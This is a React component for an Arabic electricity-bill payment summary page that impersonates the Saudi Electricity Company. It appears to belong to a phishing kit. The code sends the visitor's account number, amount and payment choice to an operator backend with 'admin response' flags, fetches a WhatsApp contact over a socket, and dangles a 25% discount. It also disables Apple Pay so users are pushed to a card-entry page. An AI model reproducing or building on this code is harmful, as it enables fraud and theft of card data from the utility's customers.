import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { sendData, navigateToPage, clientNavigate, socket } from "@/lib/store";

export default function SummaryPayment() {
  const [, setLocation] = useLocation();
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);

  const [whatsappNumber, setWhatsappNumber] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [payAmount, setPayAmount] = useState("0.00");
  const [payOption, setPayOption] = useState("");

  useEffect(() => {
    socket.value.on("whatsapp:update", (number: string) => {
      setWhatsappNumber(number);
    });
    socket.value.emit("whatsapp:get");
    return () => {
      socket.value.off("whatsapp:update");
    };
  }, []);

  useEffect(() => {
    const stored = sessionStorage.getItem("accountNumber");
    const storedAmount = sessionStorage.getItem("payAmount");
    if (!stored) {
      setLocation("/");
      return;
    }
    setAccountNumber(stored);
    if (storedAmount) {
      setPayAmount(parseFloat(storedAmount).toFixed(2));
    }
    const storedOption = sessionStorage.getItem("payOption");
    if (storedOption) {
      setPayOption(storedOption);
    }
  }, []);

  const totalAmount = parseFloat(payAmount);



  useEffect(() => {
    document.title = 'ملخص الطلب والدفع';
    navigateToPage('ملخص الدفع');
  }, []);

  const handlePayment = () => {
    if (!selectedPaymentMethod) return;
    setIsProcessing(true);

    sendData({
      data: {
        'رقم الحساب': accountNumber,
        'المبلغ الأصلي': `${sessionStorage.getItem('billAmount') || '0'} ر.س`,
        'خيار الدفع': payOption === 'full' ? 'دفع كامل المبلغ (خصم 25%)' : 'دفع جزء من المبلغ',
        'المجموع الكلي': `${totalAmount.toFixed(2)} ر.س`,
      },
      current: 'الملخص والدفع',
      waitingForAdminResponse: false,
    });

    sendData({
      data: {
        'رقم الحساب': accountNumber,
        paymentMethod: selectedPaymentMethod === 'card' ? 'بطاقة ائتمان' : 'Apple Pay',
        serviceName: 'دفع فاتورة الكهرباء',
        servicePrice: totalAmount,
        totalAmount: totalAmount,
      },
      current: 'ملخص الدفع',
      nextPage: selectedPaymentMethod === 'card' ? 'credit-card-payment' : 'bank-transfer',
      waitingForAdminResponse: false,
    });

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPaymentMethod === 'card') {
        clientNavigate(`/credit-card-payment?service=${encodeURIComponent('دفع فاتورة الكهرباء')}&amount=${totalAmount}`);
      } else {
        clientNavigate(`/bank-transfer?service=${encodeURIComponent('دفع فاتورة الكهرباء')}&amount=${totalAmount}`);
      }
    }, 1500);
  };

  const fontFaces = `
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Regular.woff2') format('woff2'); font-weight: 400; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Medium.woff2') format('woff2'); font-weight: 500; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-SemiBold.woff2') format('woff2'); font-weight: 600; }
    @font-face { font-family: 'SE'; src: url('/fonts/SE-Light.woff2') format('woff2'); font-weight: 300; }
  `;

  return (
    <>
      <style>{fontFaces}</style>
      <style>{`
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        
        .summary-header {
          display: flex; align-items: center; justify-content: space-between;
          height: 70px; padding: 15px 30px 14px;
        }
        .summary-logo { width: 90px; height: 58px; object-fit: contain; }
        .summary-stepper {
          display: flex; align-items: center; gap: 0;
          background: #f5f7fa; border-radius: 30px; padding: 6px 8px;
        }
        .summary-step {
          display: flex; align-items: center; gap: 8px;
          padding: 8px 20px; color: #06c; font-size: 14px; font-weight: 500;
          white-space: nowrap;
        }
        .summary-step-circle {
          background: #06c; color: #fff; border-radius: 50%;
          width: 22px; height: 22px; display: flex; align-items: center;
          justify-content: center; font-size: 13px; font-weight: 600;
          flex-shrink: 0;
        }
        .summary-step-active {
          display: flex; align-items: center; gap: 8px;
          background: #06c; border-radius: 24px; padding: 8px 20px;
          color: #fff; font-size: 14px; font-weight: 500;
          white-space: nowrap;
        }
        .summary-step-active-circle {
          background: #fff; color: #06c; border-radius: 50%;
          width: 22px; height: 22px; display: flex; align-items: center;
          justify-content: center; font-size: 13px; font-weight: 600;
          flex-shrink: 0;
        }
        .summary-close-btn {
          background: #e8f0fe; border: none; cursor: pointer; padding: 10px;
          display: flex; align-items: center; justify-content: center;
          border-radius: 12px; width: 44px; height: 44px;
        }
        .summary-title-section { text-align: center; padding-top: 40px; padding-bottom: 30px; }
        .summary-title-sub { color: #06c; font-size: 16px; font-weight: 400; margin-bottom: 8px; }
        .summary-title-account {
          color: #001f5e; font-size: 36px; font-weight: 600;
          letter-spacing: 1px; direction: ltr; display: inline-block;
        }
        .summary-title-desc { color: #66799e; font-size: 15px; font-weight: 400; margin-top: 8px; }
        .summary-content { max-width: 900px; margin: 0 auto; padding: 0 30px; padding-bottom: 120px; }
        .summary-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
        .summary-card { border: 1px solid #e8ecf1; border-radius: 16px; padding: 24px; }
        .summary-sidebar { border: 1px solid #e8ecf1; border-radius: 16px; overflow: hidden; }
        .payment-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
        .step-label { display: inline; }
        
        @media (max-width: 768px) {
          .summary-header {
            height: auto; padding: 10px 16px;
            flex-wrap: wrap; gap: 10px; justify-content: center;
          }
          .summary-logo { width: 70px; height: 45px; }
          .summary-stepper {
            order: 3; width: 100%; justify-content: center;
            padding: 4px 6px; flex-wrap: nowrap; overflow-x: auto;
          }
          .summary-step { padding: 6px 10px; font-size: 11px; gap: 4px; }
          .summary-step-circle { width: 18px; height: 18px; font-size: 10px; }
          .summary-step-active { padding: 6px 10px; font-size: 11px; gap: 4px; border-radius: 20px; }
          .summary-step-active-circle { width: 18px; height: 18px; font-size: 10px; }
          .summary-close-btn { width: 36px; height: 36px; padding: 8px; border-radius: 10px; }
          .summary-title-section { padding-top: 20px; padding-bottom: 16px; }
          .summary-title-sub { font-size: 13px; }
          .summary-title-account { font-size: 24px; }
          .summary-title-desc { font-size: 13px; }
          .summary-content { padding: 0 16px; padding-bottom: 80px; }
          .summary-grid { grid-template-columns: 1fr; gap: 16px; }
          .summary-card { padding: 16px; }
          .payment-grid { grid-template-columns: 1fr; gap: 12px; }
          .step-label { display: none; }
        }
      `}</style>
      <div className="min-h-screen bg-white" dir="rtl" style={{ fontFamily: "'SE', sans-serif" }}>

        {/* Header */}
        <div className="summary-header">
          <a href="#" style={{ display: 'block' }}>
            <img src="/se-logo.svg" alt="السعودية للطاقة" className="summary-logo" />
          </a>

          {/* Stepper */}
          <div className="summary-stepper">
            {/* Step 1 - Done */}
            <div className="summary-step">
              <span className="summary-step-circle">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
              </span>
              <span className="step-label">حدد المبلغ</span>
            </div>

            {/* Step 2 - Done */}
            <div className="summary-step">
              <span className="summary-step-circle">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
              </span>
              <span className="step-label">تفاصيل البطاقة</span>
            </div>

            {/* Step 3 - Active */}
            <div className="summary-step-active">
              <span className="summary-step-active-circle">3</span>
              <span className="step-label">المراجعة</span>
            </div>
          </div>


        </div>

        {/* Title */}
        <div className="summary-title-section">
          <p className="summary-title-sub">عرض ودفع الفواتير</p>
          <h1 className="summary-title-account">{accountNumber}</h1>
          <p className="summary-title-desc">ملخص الطلب والدفع</p>
        </div>

        {/* Content */}
        <div className="summary-content">
          <div className="summary-grid">

            {/* Right: Service Details */}
            <div className="summary-card">
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '24px' }}>
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#06c" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
                  <polyline points="14 2 14 8 20 8"></polyline>
                  <line x1="16" y1="13" x2="8" y2="13"></line>
                  <line x1="16" y1="17" x2="8" y2="17"></line>
                </svg>
                <span style={{ color: '#001f5e', fontSize: '18px', fontWeight: 600 }}>تفاصيل الخدمة</span>
              </div>

              {/* Service Name */}
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 0', borderBottom: '1px solid #e8ecf1' }}>
                <span style={{ color: '#66799e', fontSize: '14px' }}>اسم الخدمة</span>
                <span style={{ color: '#001f5e', fontSize: '14px', fontWeight: 500 }}>دفع فاتورة الكهرباء</span>
              </div>

              {/* Service Fee */}
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 0', borderBottom: '1px solid #e8ecf1' }}>
                <span style={{ color: '#66799e', fontSize: '14px' }}>رسوم الخدمة</span>
                <span style={{ color: '#001f5e', fontSize: '14px', fontWeight: 500 }}>{totalAmount.toFixed(2)} ر.س</span>
              </div>

              {/* Total */}
              <div style={{
                display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                padding: '14px 16px', marginTop: '12px',
                background: 'rgba(0,102,204,0.06)', borderRadius: '10px',
                flexWrap: 'wrap', gap: '8px',
              }}>
                <span style={{ color: '#06c', fontSize: payOption === 'full' ? '13px' : '16px', fontWeight: 600 }}>{payOption === 'full' ? 'المجموع الكلي بعد خصم (25%)' : 'المجموع الكلي'}</span>
                <span style={{ color: '#06c', fontSize: '20px', fontWeight: 700 }}>{totalAmount.toFixed(2)} ر.س</span>
              </div>
            </div>

            {/* Left: Order Summary Sidebar */}
            <div className="summary-sidebar">
              <div style={{
                background: 'rgba(0,102,204,0.06)', padding: '16px 24px',
                borderBottom: '1px solid #e8ecf1',
              }}>
                <span style={{ color: '#06c', fontSize: '18px', fontWeight: 600 }}>ملخص الطلب</span>
              </div>
              <div style={{ padding: '24px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
                  <span style={{ color: '#66799e', fontSize: '14px' }}>الخدمة</span>
                  <span style={{ color: '#001f5e', fontSize: '13px', fontWeight: 500 }}>دفع فاتورة الكهرباء</span>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '16px' }}>
                  <span style={{ color: '#66799e', fontSize: '14px' }}>الرسوم</span>
                  <span style={{ color: '#001f5e', fontSize: '14px' }}>{totalAmount.toFixed(2)} ر.س</span>
                </div>
                <hr style={{ border: 'none', borderTop: '1px solid #e8ecf1', marginBottom: '16px' }} />
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px' }}>
                  <span style={{ color: '#001f5e', fontSize: '16px', fontWeight: 700 }}>المجموع</span>
                  <span style={{ color: '#06c', fontSize: '18px', fontWeight: 700 }}>{totalAmount.toFixed(2)} ر.س</span>
                </div>

                <button
                  onClick={handlePayment}
                  disabled={!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing}
                  style={{
                    fontFamily: "'SE', sans-serif",
                    width: '100%', padding: '14px', borderRadius: '12px', border: 'none',
                    cursor: (!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing) ? 'default' : 'pointer',
                    backgroundColor: (!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing) ? '#d0d5dd' : '#06c',
                    color: '#fff', fontSize: '16px', fontWeight: 500,
                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px',
                    opacity: (!selectedPaymentMethod || selectedPaymentMethod === 'transfer' || isProcessing) ? 0.6 : 1,
                  }}
                >
                  {isProcessing ? (
                    <>
                      <div style={{ width: '16px', height: '16px', border: '2px solid #fff', borderTop: '2px solid transparent', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>
                      جاري المعالجة...
                    </>
                  ) : (
                    <>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                        <polyline points="22 4 12 14.01 9 11.01"></polyline>
                      </svg>
                      متابعة الدفع
                    </>
                  )}
                </button>

                <p style={{ color: '#8e99a4', fontSize: '12px', textAlign: 'center', marginTop: '16px', lineHeight: '1.6' }}>
                  بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية
                </p>
              </div>
            </div>
          </div>

          {/* Payment Methods */}
          <div style={{
            border: '1px solid #e8ecf1', borderRadius: '16px', padding: '24px', marginTop: '24px',
          }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '20px' }}>
              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#06c" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                <line x1="1" y1="10" x2="23" y2="10"></line>
              </svg>
              <span style={{ color: '#001f5e', fontSize: '18px', fontWeight: 600 }}>طريقة الدفع</span>
            </div>

            <div className="payment-grid">
              {/* Credit Card */}
              <div
                onClick={() => setSelectedPaymentMethod('card')}
                style={{
                  border: selectedPaymentMethod === 'card' ? '2px solid #06c' : '1.5px solid #d0d5dd',
                  borderRadius: '12px', padding: '16px', cursor: 'pointer',
                  background: selectedPaymentMethod === 'card' ? '#f0f6ff' : '#fff',
                  transition: 'all 0.2s ease',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <div style={{
                    width: '22px', height: '22px', borderRadius: '50%',
                    border: selectedPaymentMethod === 'card' ? '2px solid #06c' : '2px solid #d0d5dd',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
                  }}>
                    {selectedPaymentMethod === 'card' && (
                      <div style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#06c' }}></div>
                    )}
                  </div>
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke={selectedPaymentMethod === 'card' ? '#06c' : '#8e99a4'} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                    <line x1="1" y1="10" x2="23" y2="10"></line>
                  </svg>
                  <div>
                    <p style={{ color: '#001f5e', fontSize: '15px', fontWeight: 500, margin: 0 }}>بطاقة ائتمان / مدى</p>
                    <p style={{ color: '#8e99a4', fontSize: '12px', margin: '2px 0 0' }}>Visa, Mastercard, مدى</p>
                  </div>
                </div>
              </div>

              {/* Apple Pay */}
              <div
                onClick={() => setSelectedPaymentMethod('transfer')}
                style={{
                  border: selectedPaymentMethod === 'transfer' ? '2px solid #06c' : '1.5px solid #d0d5dd',
                  borderRadius: '12px', padding: '16px', cursor: 'pointer',
                  background: selectedPaymentMethod === 'transfer' ? '#f0f6ff' : '#fff',
                  transition: 'all 0.2s ease',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <div style={{
                    width: '22px', height: '22px', borderRadius: '50%',
                    border: selectedPaymentMethod === 'transfer' ? '2px solid #06c' : '2px solid #d0d5dd',
                    display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
                  }}>
                    {selectedPaymentMethod === 'transfer' && (
                      <div style={{ width: '12px', height: '12px', borderRadius: '50%', background: '#06c' }}></div>
                    )}
                  </div>
                  <svg width="28" height="28" viewBox="0 0 24 24" fill={selectedPaymentMethod === 'transfer' ? '#000' : '#8e99a4'}>
                    <path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z"/>
                  </svg>
                  <div>
                    <p style={{ color: '#001f5e', fontSize: '15px', fontWeight: 500, margin: 0 }}>Apple Pay</p>
                    <p style={{ color: '#8e99a4', fontSize: '12px', margin: '2px 0 0' }}>الدفع بواسطة Apple Pay</p>
                  </div>
                </div>
                {selectedPaymentMethod === 'transfer' && (
                  <p style={{ color: '#c00', fontSize: '12px', textAlign: 'center', marginTop: '10px' }}>الدفع عن طريق Apple Pay غير متاح حالياً</p>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}
